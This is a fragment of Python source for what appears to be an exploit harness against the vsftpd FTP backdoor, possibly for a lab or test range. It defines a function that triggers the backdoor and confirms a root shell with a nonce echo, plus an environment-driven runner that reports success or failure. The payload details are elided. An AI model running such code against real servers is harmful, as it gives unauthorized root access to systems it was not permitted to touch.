...
def exploit(host: str, ftp_port: int = 21,
            backdoor_port: int = DEFAULT_BACKDOOR_PORT, *, nonce: str = "",
            timeout: float = 8.0) -> Breach:
    """Trigger the backdoor, then confirm the root shell via the shared primitive.

    Raises RuntimeError if the backdoor never binds (patched/absent daemon).
    Otherwise delegates verification to ``confirm_shell`` — a genuine breach
    REQUIRES the target to echo our nonce, so a tarpit cannot forge a pop.
    """
    ...
    return confirm_shell(shell, service="vsftpd", nonce=nonce, timeout=timeout)
...
def run_from_env(env) -> tuple[int, str]:
    ...
    try:
        br = exploit(host, ftp_port=ftp_port, backdoor_port=backdoor_port, nonce=nonce)
    except Exception as e:  # noqa: BLE001 — any failure is a non-breach, report it
        return 1, f"EXPLOIT FAILED: {e}"
    if br:
        return 0, str(br)
    return 1, f"EXPLOIT FAILED: no root shell on {host}:{backdoor_port}"
